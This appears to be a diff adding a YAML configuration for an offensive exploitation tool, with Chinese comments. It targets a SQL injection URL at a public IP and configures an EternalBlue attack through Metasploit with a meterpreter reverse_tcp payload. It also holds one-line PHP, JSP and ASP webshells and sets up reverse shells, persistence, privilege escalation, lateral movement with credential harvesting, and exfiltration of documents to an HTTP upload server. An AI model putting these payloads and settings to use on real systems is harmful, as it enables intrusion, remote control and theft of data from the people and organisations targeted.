@@ -1,0 +1,195 @@
+# 通用配置
+general:
+  timeout: 30                    # 默认超时时间（秒）
+  concurrency: 5                 # 并发数
+  userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+  proxy: ""                      # 代理设置，如: "http://127.0.0.1:8080"
+  verbose: false                 # 是否启用详细输出
+  maxRetries: 3                  # 最大重试次数
+  delayBetween: 100              # 请求间隔（毫秒）
+  parentScriptID: "sqli-exploit-001"  # 父节点ID，用于攻击路径追踪
+
+# 日志配置
+logConfig:
+  enabled: true
+  level: "info"                  # debug, info, warn, error
+  format: "text"                 # text, json
+  filePath: "logs/exploit.log"
+  maxSize: 100                   # MB
+  maxBackups: 5
+  maxAge: 30                     # 天
+  compress: true
+  enableConsole: true
+
+# 要使用的漏洞利用器类型 (sql_injection, file_upload, eternal_blue)
+exploiter: "sql_injection"
+
+# 目标配置
+target:
+  # Web漏洞利用目标配置 (用于SQL注入、XSS等Web漏洞)
+  web:
+    url: "http://101.37.69.113:8770/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2"  # Web目标URL
+    headers:
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+      "Accept-Language": "en-US,en;q=0.5"
+      "Accept-Encoding": "gzip, deflate"
+    cookies: ""
+    followRedirects: true
+    verifySSL: false
+  
+  # 主机漏洞利用目标配置 (用于永恒之蓝、远程代码执行等主机漏洞)
+  host:
+    ip: "192.168.3.9"           # 目标主机IP
+    port: 445                   # 目标端口
+    protocol: "smb"             # 协议类型 (smb, rdp, ssh等)
+
+# 漏洞利用器配置
+exploiters:
+  # SQL注入配置
+  sqlInjection:
+    timeout: 45
+    parameter: "name"            # 注入参数名
+
+  # 文件上传配置
+#  fileUpload:
+#    enabled: true
+#    timeout: 60
+#    maxFileSize: 10485760        # 10MB
+#    uploadField: "file"
+#    testExtensions:
+#      - ".php"
+#      - ".jsp"
+#      - ".asp"
+#      - ".aspx"
+#      - ".py"
+#    bypassTechniques:
+#      - "double_extension"
+#      - "null_byte"
+#      - "mime_type"
+#      - "case_variation"
+#    webshells:
+#      php: "<?php system($_GET['cmd']); ?>"
+#      jsp: "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"
+#      asp: "<%eval request(\"cmd\")%>"
+
+  # 永恒之蓝配置
+  eternalBlue:
+    enabled: true
+    timeout: 120
+    defaultPort: 445
+    msfConfig:
+      host: "192.168.0.68"
+      port: 55553
+      user: "msf"
+      pass: "password"
+    payloadConfig:
+      lhost: "192.168.0.68"       # 本地监听IP
+      lport: 4444                   # 本地监听端口
+      payload: "windows/x64/meterpreter/reverse_tcp"
+    exploitOptions:
+      target: 0
+      maxExploitAttempts: 3
+
+# 后渗透配置
+postExploit:
+  enabled: false
+
+  # 反向Shell配置
+  reverseShell:
+    listenerHost: "192.168.1.100"
+    listenerPort: 4444
+    shellType: "bash"             # bash, powershell, cmd
+    timeout: 300
+    autoStart: false
+
+  # Webshell配置
+  webshell:
+    uploadPath: "/var/www/html/"
+    shellFile: "shell.php"
+    password: "admin123"
+    customShells:
+      - "c99.php"
+      - "r57.php"
+      - "wso.php"
+
+  # 持久化配置
+  persistence:
+    enabled: false
+    methods:
+      - "registry"
+      - "service"
+      - "scheduled_task"
+    backupShells: 2
+
+  # 提权配置
+  privilege:
+    enabled: false
+    autoPrivesc: false
+    methods:
+      - "kernel_exploit"
+      - "service_exploit"
+      - "dll_hijacking"
+
+  # 横向移动配置
+  lateral:
+    enabled: false
+    scanInternalNetwork: false
+    credentialHarvesting: false
+    networkRange: "192.168.1.0/24"
+
+  # 数据外带配置
+  exfiltration:
+    enabled: false
+    methods:
+      - "http"
+      - "dns"
+      - "ftp"
+    exfilServer: "http://192.168.1.100:8080/upload"
+    maxFileSize: 104857600        # 100MB
+    targetFiles:
+      - "*.txt"
+      - "*.doc"
+      - "*.pdf"
+      - "*.xls"
+
+  # 清理配置
+  cleanup:
+    enabled: true
+    autoCleanup: false
+    cleanupDelay: 300             # 秒
+    removeUploaded: true
+    clearLogs: false
+
+# 输出配置
+output:
+  format: "text"                 # text, json, xml
+  saveResults: true
+  resultsPath: "results/"
+  includeEvidence: true
+  includeRawResponse: false
+  timestampFormat: "2006-01-02 15:04:05"
+
+# 安全配置
+security:
+  maxConcurrentTargets: 10
+  rateLimiting:
+    enabled: true
+    requestsPerSecond: 5
+    burstSize: 10
+  blacklist:
+    - "127.0.0.1"
+    - "localhost"
+    - "*.gov"
+    - "*.mil"
+  whitelist: []
+  requireConfirmation: true       # 执行前需要确认
+
+# 通知配置
+notifications:
+  enabled: true
+  # Webhook通知
+  webhook:
+    url: "http://127.0.0.1:8889/webhook"
+    method: "POST"
+    headers:
+      "Content-Type": "application/json"
